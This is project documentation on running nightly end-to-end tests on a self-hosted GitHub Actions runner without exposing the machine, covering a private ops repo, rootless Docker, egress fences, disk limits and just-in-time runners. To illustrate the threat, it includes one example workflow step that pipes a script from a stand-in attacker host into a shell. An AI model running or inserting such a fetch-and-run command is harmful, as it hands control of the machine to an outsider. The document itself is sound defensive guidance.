# Nightly end-to-end testing on a self-hosted runner

CI on GitHub-hosted runners proves the unit and integration suites. It does not
prove that the thing *works*: that a real BTCPay Server, a real bitcoind, a real
Postgres and this API, wired together, credit the right number of satoshis the
right number of times.

That proof needs the whole regtest stack, which is too slow and too heavy for
every pull request. So it runs once a night, on a machine somebody owns.

This document describes how to do that **without handing your machine to the
internet**. Attaching a self-hosted runner to a public repository is one of the
easiest ways to lose a server, and the mistake is subtle enough that it is worth
writing down properly.

You do not need any of this to use `crypto-processing-api`. It is here because
the pattern is reusable, and because an adopter should be able to see how the
project's own end-to-end claims are produced.

---

## The problem with self-hosted runners on public repositories

For `pull_request` events, GitHub takes the workflow files from the pull
request's merge ref — the attacker's version, not yours. So a fork can add:

```yaml
jobs:
  build:
    runs-on: [self-hosted]     # added by the pull request
    steps:
      - run: curl attacker.example/x.sh | sh
```

…and your machine runs it. GitHub's own guidance is that self-hosted runners
should almost never be attached to a public repository.

The usual mitigations are weaker than they look:

| Mitigation | Why it is not enough |
| --- | --- |
| *Require approval for all outside collaborators* | A human gate. One distracted click and the code runs. |
| Removing `pull_request` from your workflows | The attacker supplies the workflow file, not you. |
| Runner groups with *allow public repositories = off* | The right answer — but runner groups only exist for organizations. Personal accounts do not have them. |
| Ephemeral runners | Limits persistence, not the initial execution. |

---

## The structural fix: an ops repository

**Create a second, private repository. Register the runner only there.**

```
your-org/project            public   ← the code. No runner. Ever.
your-org/project-nightly    private  ← the only runner registration
```

The nightly workflow lives in the private repo and checks the public repo out as
*data*:

```yaml
on:
  schedule: [{cron: "17 0 * * *"}]
  workflow_dispatch: {}

jobs:
  e2e:
    runs-on: [self-hosted, linux, x64, your-label]
    timeout-minutes: 90
    steps:
      - uses: actions/checkout@<full-40-char-sha>
        with:
          repository: your-org/project
          ref: main
          persist-credentials: false
```

A fork pull request cannot reach this runner for the same reason it cannot reach
any other repository's runners: **there is no registration**. This is not a
setting that can be misconfigured back into danger. The attack path does not
exist.

Three rules make it hold:

1. **Triggers are `schedule` and `workflow_dispatch` only.** No `pull_request`,
   no `pull_request_target`, no `workflow_run`. Only somebody who can write to
   the private repo can cause a run.
2. **The checkout is pinned to the public repo's default branch.** Never a ref
   an outsider controls. `persist-credentials: false` keeps the job's token out
   of the checked-out repo's git config.
3. **Actions are pinned by full commit SHA, not by tag.** A tag can be moved.

The cost is small: one extra private repo, and the nightly workflow is not
visible to readers of the public repo. Publishing a copy of it — as this project
does, in this document — recovers most of that.

---

## Defence in depth on the box

Structural isolation removes *malicious* code. It does nothing about
*accidental* damage — a runaway compose stack filling the disk of a machine that
does other work. If the box is dedicated, you can stop reading here. If it is
shared, these five fences are what make the arrangement safe to live with.

### 1. Do not use the machine's main Docker daemon

If the runner can reach the host's Docker socket, it can do anything root can
do. Mounting `/var/run/docker.sock` into a CI container is equivalent to giving
CI root.

Two better options:

- **Rootless Docker.** A second daemon, owned by an unprivileged user, with its
  own socket, data-root and network namespace. Containers run as a subuid
  range, so an escape lands as an unprivileged user, not as root. This is also
  the only option if the CI user must not be in the `docker` group.
- **A sibling `docker:dind` container.** The job talks to a Docker daemon that
  is itself a container. Everything the job builds and runs lives inside that
  one container's storage.

They compose well, and this project uses both: a rootless daemon that hosts a
dind container that hosts the regtest stack. The practical benefit of dind is
that teardown is *total* — `docker compose down -v` plus a prune inside dind
genuinely returns the machine to where it started, with no stray volumes.

Two details that are easy to get wrong:

- **Bind the inner daemon's API to loopback, not `0.0.0.0`.** Inside dind,
  `0.0.0.0` includes the bridge gateway that every container of your test stack
  can reach — that is an unauthenticated root Docker API offered to the code
  under test. Note that `docker:dind`'s entrypoint adds
  `--host=tcp://0.0.0.0:2375` on its own whenever the command is empty or starts
  with a flag; naming `dockerd` as the first word of the command skips that.
- **Let the runner share dind's network namespace** (`network_mode:
  service:dind`). Ports your compose stack publishes on `127.0.0.1` then land
  where test scripts expect them, and the inner API stays reachable without any
  port being exposed to the host.

### 2. Resource limits

```yaml
dind:    {cpus: 3, mem_limit: 8g, pids_limit: 2048}
runner:  {cpus: 1, mem_limit: 1g, pids_limit: 1024}
```

Under rootless Docker these need cgroup delegation for the user slice. Most
modern systemd installations delegate `cpu`, `memory` and `pids` already; check
`/sys/fs/cgroup/user.slice/user-$(id -u).slice/cgroup.controllers` before
assuming a limit you set is being enforced.

### 3. Block the private network

CI on a home or office machine can reach everything else on that network:
routers, NAS boxes, other services, the host's own SSH. Test code is not
attacker code, but a dependency with a postinstall script might be.

The fence: **allow the public internet, reject RFC1918 and friends.**

```
reject  10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16   private networks
reject  169.254.0.0/16                              link-local, cloud metadata
reject  100.64.0.0/10                               CGNAT, e.g. Tailscale
```

Where those rules go depends on what you are allowed to touch:

- **Root available:** add them to Docker's `DOCKER-USER` chain on the host,
  scoped to the CI bridge's subnet. Docker promises not to rewrite that chain.
- **No root:** rootless Docker keeps its whole network stack in a namespace the
  CI user owns, with its own `iptables`, so the same rules can be written
  *inside* that namespace and the host firewall is never touched. Enter it with
  `nsenter -U --preserve-credentials -n -t $(cat $XDG_RUNTIME_DIR/docker.pid)`.
  Scope the rules to the namespace's uplink interface so container-to-container
  traffic is unaffected — and let the namespace's own gateway subnet through
  first, or DNS stops working.
- **Neither:** put the test stack on an `internal: true` Docker network and give
  it one dual-homed proxy container with a hostname allowlist. More moving
  parts, and the allowlist needs maintaining.

Whichever you build, **prove it, and prove it on every run**. Rules that live in
a namespace disappear when the daemon restarts, so a fence applied at install
time is not a fence a year later. The job's second step should be:

```bash
blocked <your-host-lan-ip> 22      # must fail
blocked <a-neighbour-service> 8080 # must fail
open    https://ghcr.io/           # must succeed
```

A run where the fence is missing then goes red instead of going quiet. And the
"must succeed" half matters as much as the other: a fence that blocks the
registry is an outage, not a control.

### 4. Bound the disk

Disk is the resource CI exhausts first, and a full disk on a shared machine is
an outage for everything else on it.

- **Best:** put the inner daemon's data-root on a fixed-size filesystem — a
  loopback file, an LVM volume, a filesystem with project quotas. Growth then
  hits `ENOSPC` inside the container and the host never notices. All of these
  need root to create.
- **Otherwise:** a watcher on a timer that stops the stack when free space falls
  below a floor or the CI data-root grows past a cap. This samples rather than
  enforces, so a fast writer can overshoot between two samples; set the floor
  well above zero to absorb that.

Either way, **assert free space after teardown and fail the run if it is
short.** A night that leaves the machine fuller than it found it is a failed
night even when every test passed. That single assertion is what turns a slow
leak into a caught bug rather than a Sunday-morning outage.

### 5. No long-lived runner credential

Use **just-in-time (JIT) runners**. For each job, a host-side script exchanges a
registration token for a single-use `encoded_jit_config`:

```
POST /repos/{owner}/{repo}/actions/runners/generate-jitconfig
  {"name": "...", "runner_group_id": 1, "labels": [...], "work_folder": "_work"}
```

The runner takes exactly one job and exits; a supervisor restarts the script and
the next job gets a fresh registration. Two properties are worth stating:

- **The registration token never enters the runner container.** Only the derived
  JIT config does — pass it through the environment rather than argv, because
  `/proc/<pid>/cmdline` is world-readable.
- **The token should be a fine-grained PAT scoped to the ops repo alone**, with
  `Administration: read and write` and nothing else. A classic token or a CLI
  token usually works, and is usually account-wide — which means a compromised
  box reaches every repository you own.

Store the token in a file readable only by the account that needs it, ideally
root-owned with the mint script running as root. Note the honest limit: if the
mint script runs as the same unprivileged user as everything else, then anything
running as that user can read the token. Scoping the PAT is what bounds that.

---

## Knowing when the nightly stops

The failure that actually happens is not a red run. It is silence: the machine
is off, the runner never came back after a power cut, the token expired, or
GitHub disabled the schedule.

GitHub **disables scheduled workflows in a repository with no commits for 60
days**. In a repo whose only job is a nightly, that clock is always running.

Two independent mechanisms:

1. **A failure alert from the job itself** — a `curl` to a push service in an
   `if: failure()` step. GitHub's own failure email is the backup.
2. **A dead man's switch** — a second workflow on a *GitHub-hosted* runner, so
   it still works when your machine is down, using the plain `GITHUB_TOKEN`, so
   it holds no credential that could reach the machine. It asks the API when the
   last successful nightly was and alerts if that is older than 26 hours.

And **a heartbeat**: the nightly's last step on success commits a small file to
the ops repo. That resets the 60-day clock for both workflows — otherwise the
watchdog meant to notice the silence goes silent with it — and gives the
watchdog a second, independent signal to read.

---

## What the nightly actually runs

For this project, in order:

| Step | What it proves |
| --- | --- |
| Free-space preflight | The box can afford the run at all. |
| Egress fence proof | The fence is still there tonight. |
| Checkout public `main` | Only merged code runs. |
| `pip install -e ".[dev]"` | The published dependency set resolves today. |
| `docker compose -f deploy/docker-compose.regtest.yml up -d --build` | bitcoind, NBXplorer, BTCPay, two Postgres and the API come up together. |
| Wait for `synchronized: true` | See "cold-start ordering" below. |
| `scripts/bootstrap_btcpay.py` | The store, wallet, API key and webhook can be configured headlessly. |
| `up -d --force-recreate api worker` | The API picks up the credentials bootstrap just generated. |
| `scripts/dev/smoke_test.py --drill all` | Drills 1–7: deposit, outage, replay, late payment, withdrawal, approval, crash. Every assertion is a satoshi count. |
| `HYPOTHESIS_PROFILE=nightly pytest tests/integration` | The wide, randomised property search a pull request cannot afford. |
| `pip-audit` | New CVEs in the pinned dependency set. |
| `down -v` + prune, in `always()` | The box is returned to where it started. |
| Free-space assertion | …and that is checked, not assumed. |
| Heartbeat commit | The schedule stays alive. |

The virtualenv is created *outside* the checkout: this repo has no
`.dockerignore`, so anything inside it is uploaded as build context when the API
image is built.

### Cold-start ordering

Both of the workflow's first two failures were ordering problems, and both are
invisible when a person runs the same commands by hand. They are worth naming,
because any project wiring up a nightly will meet the same shape of bug.

**A service that answers is not a service that is ready.** BTCPay's
`/api/v1/health` replies while the body still says `{"synchronized": false}` —
NBXplorer has not caught up with bitcoind. Ask it to generate a wallet in that
window and it returns 503, "BTC-CHAIN services are not currently available".
Nobody sees this locally, because a human types the bootstrap command several
seconds after `up -d`. A cold machine starting seven services at once loses the
race. Gate on the readiness field, not on the endpoint answering.

**Follow the documented sequence exactly, including the boring step.** The
repo's README gives four commands, and the third is
`up -d --force-recreate api worker`. It is there because `bootstrap_btcpay.py`
writes credentials into `.env.regtest.generated`, and Compose reads `env_file`
when it *creates* a container — the API started before that file existed. Skip
it and the API runs with no BTCPay credentials, so the first drill fails with a
500 that looks like an application bug and is not one.

A useful habit: after a step that changes configuration, wait for the thing that
consumes it to report healthy, and fail *there* with its logs attached. A
failure at the step that caused it costs minutes to read. The same failure
surfacing three steps later, inside a test, costs an evening.

`HYPOTHESIS_PROFILE=nightly` is the same suite CI runs, with `max_examples`
raised and the derandomisation removed. A pull request must not go red on
someone else's luck; the nightly is where the random search belongs.

---

## Reusing this

The runner-side pieces of this project's setup — compose file, JIT mint script,
egress fence, disk guard, systemd units — are small and generic. The security
model is the part worth copying:

1. The runner is registered to a private ops repo, never to the public one.
2. Triggers are `schedule` and `workflow_dispatch` only.
3. The public repo is checked out as data, pinned to its default branch.
4. Actions are pinned by SHA, images by digest.
5. The CI daemon is not the machine's main Docker daemon.
6. The private network is unreachable, and that is re-proved every run.
7. Disk is bounded, and free space is asserted after teardown.
8. Runner registrations are just-in-time and single-use.
9. A watchdog on a *different* machine notices silence.

See [`SECURITY-AUDIT.md`](../SECURITY-AUDIT.md) for which of these are live in
this project today, and which are documented gaps.
